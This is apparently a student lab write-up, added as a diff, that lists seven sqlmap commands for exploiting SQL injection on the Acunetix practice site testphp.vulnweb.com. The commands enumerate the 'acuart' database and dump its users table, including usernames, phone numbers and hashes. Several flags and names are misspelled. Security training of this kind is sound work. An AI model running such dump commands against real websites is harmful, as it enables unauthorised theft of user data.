@@ -1,0 +1,22 @@
+Step 1:
+opend the link of vulenrable website and pasted the link in terminal using the command
+$ sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 --dbs to get the database.
+STEP 2:
+Using the command = $ sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart --tables, extracted
+the tables from the database.
+Step 3:
+With this command = $ sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users --coulmns,
+fetching coulmns for the table "users" in database "acurat"
+Step 4:
+This command = $ sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users -C uname --dump,is fetching
+entries of column(s) "uname" for table "users" in database "acurat"
+Step 5:
+In step 5 the command = $ sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users -C phone --dump, is used 
+to get phone coulmn from the users table.
+Step 6:
+$ sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users --dump, this command fetch coulmn from
+the table users and then fetch the entires of users and recognize hash of colmun cart.
+Step 7:
+$ sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart --dump,fetching columns 
+of all the tables of the database.
+
